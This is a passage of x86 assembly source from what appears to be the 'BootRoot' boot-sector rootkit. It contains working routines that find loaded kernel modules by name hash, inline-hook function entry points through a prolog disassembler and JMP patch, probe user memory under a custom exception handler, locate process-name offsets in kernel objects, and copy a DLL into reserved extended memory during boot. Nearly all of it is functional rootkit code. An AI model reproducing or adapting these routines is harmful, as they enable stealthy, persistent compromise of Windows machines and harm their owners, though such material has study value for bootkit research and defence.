	db		 26h,  2Eh,  36h,  3Eh,  64h,  65h,  66h, 0F0h, 0F2h, 0F3h
DISASM_NUM_INVALID EQU 5
	db		 0Fh,  67h,  9Ah, 0F1h, 0F4h
DISASM_NUM_SINGLE EQU 3
	db		0C9h, 0D6h, 0D7h
DISASM_NUM_IMM8 EQU 9
	db		 04h,  6Ah, 0A8h, 0D4h, 0D5h, 0E4h, 0E5h, 0E6h, 0E7h
DISASM_NUM_IMM EQU 3
	db		 05h,  68h, 0A9h
DISASM_NUM_MRM EQU 17
	db		 00h,  01h,  02h,  03h,  62h,  63h,  8Ch,  8Eh,  8Fh, 0C4h, 0C5h, 0D0h, 0D1h, 0D2h, 0D3h, 0FEh, 0FFh
DISASM_NUM_MRM_IMM8 EQU 7
	db		 6Bh,  80h,  82h,  83h, 0C0h, 0C1h, 0C6h
DISASM_NUM_MRM_IMM EQU 3
	db		 69h,  81h, 0C7h

@DisassembleProlog_overlists:

	pop		ebp
	xor		ecx, ecx

@DisassembleProlog_disasmloop:

	mov		eax, esi
	sub		eax, [esp+4]				; saved ESI = function entry point
	cmp		eax, [esp+24h]				; require the specified number of bytes to be displaceable
	jb		short @DisassembleProlog_disasmloop_notdone

	mov		[esp+18h], eax				; overwrite saved ECX with number of bytes disassembled
	popad
	ret							; CF must be clear since 'JB' condition was not satisfied

  @DisassembleProlog_disasmloop_notdone:

	push		4
	pop		ebx					; EBX = immediate operand size

  @DisassembleProlog_disasmloop_sameinstr:

	mov		edi, ebp

	lodsb
	mov		cl, DISASM_NUM_PREFIXES
	repne scasb
	jne		short @DisassembleProlog_disasmloop_notprefix

	cmp		al, 66h
	jne		short @DisassembleProlog_disasmloop_sameinstr
	mov		bl, 2					; 66h prefix changes immediate size from 4 bytes to 2 bytes
	jmp		short @DisassembleProlog_disasmloop_sameinstr

  @DisassembleProlog_disasmloop_notprefix:

	mov		cl, DISASM_NUM_INVALID
	repne scasb
	je		short @DisassembleProlog_fail

	cmp		al, 40h
	jae		short @DisassembleProlog_disasmloop_notop003F
	and		al, 07h					; take advantage of symmetry to reduce {00h..3Fh} to {00h..07h}

  @DisassembleProlog_disasmloop_notop003F:

	mov		cl, DISASM_NUM_SINGLE
	repne scasb
	je		short @DisassembleProlog_disasmloop

	mov		cl, DISASM_NUM_IMM8
	repne scasb
	jne		short @DisassembleProlog_disasmloop_notimm8
  @DisassembleProlog_disasmloop_doimm8:
	inc		esi
	jmp		short @DisassembleProlog_disasmloop

  @DisassembleProlog_disasmloop_notimm8:

	mov		cl, DISASM_NUM_IMM
	repne scasb
	jne		short @DisassembleProlog_disasmloop_notimm
  @DisassembleProlog_disasmloop_doimm:
	add		esi, ebx
  @DisassembleProlog_disasmloop1:
	jmp		short @DisassembleProlog_disasmloop

;---
@DisassembleProlog_fail:

	stc
	popad
	ret
;---

  @DisassembleProlog_disasmloop_notimm:

	mov		cl, DISASM_NUM_MRM
	repne scasb
	jne		short @DisassembleProlog_disasmloop_notmrmnoimm

  @DisassembleProlog_disasmloop_mrmnoimm:

	xor		ebx, ebx

  @DisassembleProlog_disasmloop_domrm:

	lodsb
	cmp		al, 0C0h
	jae		short @DisassembleProlog_disasmloop_doimm
	and		al, 0C7h				; mask out RRR field
	js		short @DisassembleProlog_disasmloop_domrm_ofs32
	test		al, 40h
	jnz		short @DisassembleProlog_disasmloop_domrm_ofs8
	cmp		al, 05h					; Mod=00, MMM=101: ofs32
	jne		short @DisassembleProlog_disasmloop_domrm_gotofs

    @DisassembleProlog_disasmloop_domrm_ofs32:

	add		ebx, 4
	jmp		short @DisassembleProlog_disasmloop_domrm_gotofs

    @DisassembleProlog_disasmloop_domrm_ofs8:

	inc		ebx

    @DisassembleProlog_disasmloop_domrm_gotofs:

	mov		ah, al
	and		al, 7
	cmp		al, 4					; MMM=100: SIB postbyte
	jne		short @DisassembleProlog_disasmloop_doimm

	lodsb
	and		al, 7
	cmp		al, 5
	jne		short @DisassembleProlog_disasmloop_doimm
	test		ah, 0C0h
	jnz		short @DisassembleProlog_disasmloop_doimm
	add		ebx, 4					; Mod=00, MMM=100, BBB=101: SIB with ofs32
	jmp		short @DisassembleProlog_disasmloop_doimm

  @DisassembleProlog_disasmloop_notmrmnoimm:

	mov		cl, DISASM_NUM_MRM_IMM8
	repne scasb
	jne		short @DisassembleProlog_disasmloop_notmrmimm8
	mov		bl, 1
	jmp		short @DisassembleProlog_disasmloop_domrm

  @DisassembleProlog_disasmloop_notmrmimm8:

	mov		cl, DISASM_NUM_MRM_IMM
	repne scasb
	je		short @DisassembleProlog_disasmloop_domrm

	cmp		al, 0F7h
	je		short @DisassembleProlog_disasmloop_opF6F7
	cmp		al, 0F6h
	jne		short @DisassembleProlog_disasmloop_notopF6F7
	mov		bl, 1

  @DisassembleProlog_disasmloop_opF6F7:

	test		byte ptr [esi], 38h			; F6h/0, F7h/0 (OOO=000): imm or imm8, otherwise no immediate
	jnz		short @DisassembleProlog_disasmloop_mrmnoimm
	jmp		short @DisassembleProlog_disasmloop_domrm

  @DisassembleProlog_disasmloop_notopF6F7:

	cmp		al, 61h					; {06h,07h,0Eh,16h,17h,1Eh,1Fh,26h,27h,2Eh,2Fh,36h,37h,3Eh..61h} are single-byte opcodes
	jbe		short @DisassembleProlog_disasmloop1
	cmp		al, 6Fh					; {6Ch..6Fh} are single-byte opcodes
	jbe		short @DisassembleProlog_disasmloop1
	cmp		al, 7Fh					; {70h..7Fh} are unsupported (Jcc)
	jbe		short @DisassembleProlog_fail
	cmp		al, 8Fh					; {84h..8Bh,8Dh} have postbytes but no immediate operand
	jbe		short @DisassembleProlog_disasmloop_mrmnoimm
	cmp		al, 9Fh					; {90h..99h,9Bh..9Fh} are single-byte opcdes
	jbe		short @DisassembleProlog_disasmloop1

	mov		bl, 4
	cmp		al, 0A3h				; {A0h..A3h} have a [near] operand, 4 bytes without 67h prefix
	jbe		short @DisassembleProlog_disasmloop_doimm

	cmp		al, 0AFh				; {A4h..AFh} are single-byte opcodes
	jbe		short @DisassembleProlog_disasmloop1
	cmp		al, 0ECh				; {ECh..FDh} are single-byte opcodes
	jae		short @DisassembleProlog_disasmloop1

	jmp		short @DisassembleProlog_fail

DisassembleProlog endp


;;
;; FindModuleInList
;;
;; Parameters:	AH  = hash of uppercased low bytes of target module's wide character name
;;		      (e.g., AH = hash("NTOSKRNL.EXE") for module with base name L"ntoskrnl.exe")
;;		ECX = size in bytes of target module's base name (e.g., 24 for L"ntoskrnl.exe")
;;		EDI = pointer to start of module list
;;
;; Returns:	EAX = pointer to module list entry for target module, if successful
;;		EBX = module base address, if successful
;;		CF clear if successful, or CF set on error
;;

FindModuleInList proc

	pushad

	mov		ebp, edi

@FindModuleInList_modloop:

	cmp		[edi+2Ch], cx				; LDR_MODULE.BaseDllName.Length
	jne		short @FindModuleInList_modloop_next	; (assume that a non-module entry won't have the proper length)

	mov		esi, [edi+30h]				; LDR_MODULE.BaseDllName.Buffer

	push		ecx
	xor		edx, edx

  @FindModuleInList_modloop_charloop:

	lodsb
	cmp		al, 'a'
	jb		short @FindModuleInList_modloop_charloop_notlower
	cmp		al, 'z'
	ja		short @FindModuleInList_modloop_charloop_notlower

	and		al, NOT 20h

    @FindModuleInList_modloop_charloop_notlower:

	ror		dl, 1
	xor		dl, al					; DL = hash accumulator

	dec		cl					; CL -=2 from DEC and LOOP
	inc		esi
	loopnz		@FindModuleInList_modloop_charloop	; loop will break if CL was odd

	pop		ecx

	cmp		dl, ah
	je		short @FindModuleInList_ret		; (CF clear if equal)

  @FindModuleInList_modloop_next:

	mov		edi, [edi]
	cmp		edi, ebp
	jne		short @FindModuleInList_modloop

	stc

@FindModuleInList_ret:

	mov		[esp+1Ch], edi				; overwrite saved EAX with pointer to module list entry
	popad
	mov		ebx, [eax+18h]				; LDR_MODULE.BaseAddress
	ret

FindModuleInList endp


;;
;; HookFunction
;;
;; Parameters:	EDX = hook function to which execution will be redirected
;;		ESI = pointer to start of function whose entry point code is to be hooked
;;		EDI = pointer to location for storing displaced code and "hook stub"
;;
;; Returns:	CF clear if successful, or CF set on failure
;;		EDI updated to point past "hook stub"
;;

HookFunction proc

	pushad

	;
	; Create hook stub
	;

	push		5
	call		DisassembleProlog
	pop		eax
	jc		short @HookFunction_done

	mov		al, 0E8h				; E8h/xxxxxxxx: CALL hook_function
	stosb
	sub		edx, edi
	lea		eax, [edx-4]
	stosd

	rep movsb						; copy "prolog" code to be displaced

	mov		al, 0E9h				; E9h/xxxxxxxx: JMP (original_function + displacement length)
	stosb
	sub		esi, edi
	lea		eax, [esi-4]
	stosd

	pop		edx					; retrieve stored EDI, pointer to start of "hook stub", and...
	pop		eax
	push		esi
	push		edi					; ...replace it with pointer past end of new "hook stub"

	;
	; Overwrite function entry point with hook JMP
	;

	xchg		edi, eax				; now EDI points to start of function to hook

	mov		al, 0E9h				; E9h/xxxxxxxx: JMP hook_stub
	stosb							; (we don't have to worry about write protection at this point)

	sub		edx, edi
	lea		eax, [edx-4]
	stosd

	clc

@HookFunction_done:

	popad
	ret

HookFunction endp


;;
;; OrangePalette
;;
;; Paramters:	none
;;
;; Returns:	none
;;

OrangePalette proc

	pushfd
	cli
	pushad

	xor		ecx, ecx

@OrangePalette_palloop:

	xor		eax, eax

		; read this color's RGB intensities and calculate scalar "grayscale" value

	mov		dx, 03C7h				; 03C7h: PEL address register for read mode
	mov		al, cl
	out		dx, al
	jmp		short $+2				; waste some time

	inc		edx
	inc		edx					; 03C9h: PEL data register

	in		al, dx
	jmp		short $+2
	imul		ebp, eax, 30				; 30% red intensity
	shr		eax, 3
	mov		ch, al

	in		al, dx
	jmp		short $+2
	imul		ebx, eax, 59				; 59% green intensity
	shr		eax, 2
	sub		ch, al

	in		al, dx
	jmp		short $+2

	cmp		al, 3
	ja		short @OrangePalette_palloop_notorange
	test		ch, ch					; don't set entry if (R / 2) ~= G, B ~= 0 (it's already orange)
	jz		short @OrangePalette_palloop_next

@OrangePalette_palloop_notorange:

	imul		eax, eax, 11				; 11% blue intensity
	add		eax, ebx
	add		eax, ebp

	push		100
	pop		ebx
	cdq
	idiv		ebx
	xchg		ebx, eax

		; set R = scalar, G = scalar / 2, B = 0 (orange)

	mov		dx, 03C8h				; 03C8h: PEL address register for write mode
	mov		al, cl
	out		dx, al
	jmp		short $+2

	inc		edx					; 03C9h: PEL data register

	mov		al, bl
	out		dx, al
	jmp		short $+2

	shr		al, 1
	out		dx, al
	jmp		short $+2

	xor		eax, eax
	out		dx, al
	jmp		short $+2

  @OrangePalette_palloop_next:

	inc		cl
	jnz		short @OrangePalette_palloop

	popad
	popfd
	ret

OrangePalette endp


;;
;; ReadWriteUserDWORD
;;
;; Parameters:	EAX = value to write, if CF set
;;		EBX = memory address from which to read or write
;;
;; Returns:	EAX = value read from location (prior to write, if CF was set on entry)
;;		CF clear if successful, or CF set on failure
;;		(ECX destroyed)
;;

ReadWriteUserDWORD proc

	;
	; Install exception handler
	;

	push		0
	pop		ecx					; ECX = 0 without modifying EFlags (must preserve CF)

	call		@ReadWriteUserDWORD_overseh		; create 'handler' field of SEH registration

;--- start of Structured Exception Handler

@ReadWriteUserDWORD_seh:

	call		@ReadWriteUserDWORD_seh_geteip
  @ReadWriteUserDWORD_seh_geteip:
	pop		eax

	mov		ecx, [esp+4]				; ExceptionRecord
	cmp		[ecx+0Ch], eax				; make sure ExceptionRecord->ExceptionAddress falls
	jb		short @ReadWriteUserDWORD_seh_unhandled	;   somewhere within the ReadWriteUserDWORD function

	add		eax, (@ReadWriteUserDWORD_ret - @ReadWriteUserDWORD_seh_geteip)
	cmp		[ecx+0Ch], eax
	ja		short @ReadWriteUserDWORD_seh_unhandled

	mov		ecx, [esp+0Ch]				; ContextRecord
	mov		[ecx+0B8h], eax				; ContextRecord->Eip = @ReadWriteUserDWORD_ret

	xor		eax, eax				; = ExceptionContinueExecution (at modified address in context EIP)
	ret

  @ReadWriteUserDWORD_seh_unhandled:

	push		1					; = ExceptionContinueSearch (we didn't handle exception)
	pop		eax
	ret

;--- end of handler

@ReadWriteUserDWORD_overseh:

	push		dword ptr fs:[ecx]			; create 'next' field of SEH registration
	mov		fs:[ecx], esp				; install ours as new top-level SEH registration

	adc		ecx, ecx				; ECX = 0 for read probe, 1 for write probe

	;
	; Ensure that target address falls within user memory arena
	;

	cmp		ds:[7FFE02B4h], ebx			; fail if address > SharedUserData->EndUserModeAddress;
	jb		short @ReadWriteUserDWORD_ret		;   CF set (indicating failure) if condition is met
								; we don't worry about spillover, since the next page of
								;   memory after the user-mode boundary should not exist

	stc							; set CF so that failure will be indicated if an exception
								;   occurs (SEH will redirect EIP to @ReadWriteUserDWORD_ret)
	jecxz		@ReadWriteUserDWORD_read

	;
	; Write value to location and return replaced value
	;

	xchg		eax, [ebx]
	jmp		short @ReadWriteUserDWORD_success

	;
	; Read value from location and return
	;

@ReadWriteUserDWORD_read:

	mov		eax, [ebx]

@ReadWriteUserDWORD_success:

	clc							; clear CF to indicate success

@ReadWriteUserDWORD_ret:

	mov		cl, 0					; ECX = 0, EFlags unaffected
	pop		dword ptr fs:[ecx]			; remove 'next' field / restore previous top-level SEH
	pop		ecx					; remove 'handler' field
	ret

ReadWriteUserDWORD endp


;;
;; ScanForProcessNameOffset
;;
;; Parameters:	EBX = pointer to process object
;;		ESI = pointer to BootRoot base (as returned by GetEffectiveBase)
;;
;; Returns:	ZF set and ECX = G_PROCESSNAMEOFS = name offset if successful, or
;;		ZF clear on error
;;		(EAX, EDI destroyed)
;;

ScanForProcessNameOffset proc

	mov		ecx, [esi+G_PROCESSNAMEOFS]
	jecxz		@ScanForProcessNameOffset_doscan

@ScanForProcessNameOffset_success:
	xor		eax, eax				; ZF cleared
@ScanForProcessNameOffset_ret:
	ret

@ScanForProcessNameOffset_doscan:

	mov		cl, (280h/4)				; arbitrary scan length in DWORDs (ECX = 0 from above)
	mov		eax, 74737953h				; "Syst"
	mov		edi, ebx
	repne scasd
	jne		short @ScanForProcessNameOffset_ret

	sub		edi, ebx				; now EDI = relative offset of name within Process object
	lea		ecx, [edi-4]
	mov		[esi+G_PROCESSNAMEOFS], ecx
	jmp		short @ScanForProcessNameOffset_success

ScanForProcessNameOffset endp


;;
;; TranslateVirtualToRaw
;; TranslateRawToVirtual
;;
;; Parameters:	EBX   = image base of module form which to perform offset conversion
;;		[ESP] = raw offset or relative virtual address to convert
;;
;; Returns:	[ESP] updated
;;

TranslateVirtualToRaw:

	pushad
	push		08h					; FIELD_OFFSET(IMAGE_SECTION_HEADER, VirtualSize)
	jmp		short @Translate

TranslateRawToVirtual:

	pushad
	push		10h					; FIELD_OFFSET(IMAGE_SECTION_HEADER, SizeOfRawData)

@Translate:

	pop		eax

	jmp		short @Translate_ret			; function does nothing unless enabled for unaligned (raw)
TRANSLATE_DISABLED EQU $-1					;   images, by setting TRANSLATE_DISABLED = 0

	mov		esi, [ebx+3Ch]				; IMAGE_DOS_HEADER.e_lfanew
	add		esi, ebx				; ptr to PE header

	movzx		ecx, word ptr [esi+06h]			; IMAGE_NT_HEADERS.FileHeader.NumberOfSections
	movzx		edi, word ptr [esi+14h]			; IMAGE_NT_HEADERS.FileHeader.SizeOfOptionalHeader
	lea		edi, [esi+edi+18h]			; IMAGE_FIRST_SECTION(ESI)

@Translate_sectionloop:

	mov		edx, [esp+24h]				; function's stack "argument"

	sub		edx, [edi+eax+4]			; PIMAGE_SECTION_HEADER->{VirtualAddress,PointerToRawData}
	jb		short @Translate_sectionloop_next

	cmp		edx, [edi+eax]				; PIMAGE_SECTION_HEADER->{VirtualSize,SizeOfRawData}
	jbe		short @Translate_sectionloop_done

  @Translate_sectionloop_next:

	add		edi, 28h
	loop		@Translate_sectionloop			; assume offset will fall in a section
								;   (if not, results are undefined)
  @Translate_sectionloop_done:

	xor		al, 1Ch					; 08h --> 14h, 10h --> 0Ch
	add		edx, [edi+eax]				; PIMAGE_SECTION_HEADER->{PointerToRawData,VirtualAddress}

	mov		[esp+24h], edx				; update stack "argument" to contain translated value

@Translate_ret:

	popad
	ret


;;
;; @PMode32CopyDLL
;;
;; 32-bit protected mode code invoked via @PMode16CopyDLL
;;
;; Parameters:	EBX = linear address of GDT (BootRoot linear + COPYGDT_START)
;;		ESI = pointer to start of source memory (DLL or BootRoot + DLL)
;;		EDI = pointer to start of reserved extended memory to receive copy
;;

@PMode32CopyDLL:

	pushad

	cmp		word ptr [esi], 5A4Dh			; IMAGE_DOS_HEADER.e_magic == IMAGE_DOS_SIGNATURE ("MZ")?
	je		short @PMode32CopyDLL_dodllsections	; if not, we're copying BootRoot + raw DLL, so don't realign

	mov		ecx, (BOOTROOT_SECTORS * 200h) + DLL_RAW_SIZE
	rep movsb
	jmp		short @PMode32CopyDLL_done

@PMode32CopyDLL_dodllsections:

	;
	; Copy each separate virtual component of DLL to reserved extended memory
	;

	mov		edx, [esi+3Ch]				; IMAGE_DOS_HEADER.e_lfanew
	add		edx, esi

		; get size of in-memory image

	mov		ecx, [edx+50h]
	mov		[ebx + (IMM_DLLSIZE - @BRCODE32_START) + BRCODE16_SIZE - COPYGDT_START], ecx

		; copy headers

	mov		ecx, [edx+54h]				; IMAGE_NT_HEADERS.OptionalHeader.SizeOfHeaders
	rep movsb						; (ECX = 0 after copy)

		; copy each section

	movzx		ebx, word ptr [edx+06h]			; IMAGE_NT_HEADERS.FileHeader.NumberOfSections

	mov		cx, [edx+14h]				; IMAGE_NT_HEADERS.FileHeader.SizeOfOptionalHeader
	lea		edx, [edx+18h+ecx+0Ch]			; IMAGE_FIRST_SECTION(EDX) + FIELD_OFFSET(IMAGE_FIRST_SECTION, VirtualAddress)

@PMode32CopyDLL_sectionloop:

	pop		edi
	pop		esi					; restore ESI and EDI from PUSHAD'ed stack data
	push		esi
	push		edi

	add		edi, [edx-0Ch+0Ch]			; IMAGE_SECTION_HEADER.VirtualAddress
	mov		ecx, [edx-0Ch+10h]			; IMAGE_SECTION_HEADER.SizeOfRawData
	add		esi, [edx-0Ch+14h]			; IMAGE_SECTION_HEADER.PointerToRawData

	rep movsb

	add		edx, 28h				; advance to next section
	dec		ebx
	jnz		@PMode32CopyDLL_sectionloop

	;
	; Switch back to 16-bit protected mode
	;

@PMode32CopyDLL_done:

	popad

	db		0EAh					; JMP FAR 0008h:@PMode16CopyDLL_done (16-bit protected mode)
	dd		(@PMode16CopyDLL_done - @BRCODE16_START)
	dw		0008h


@BRCODE32_END EQU $

BRCODE32_SIZE EQU (@BRCODE32_END - @BRCODE32_START)

BRCODE32 ENDS

END
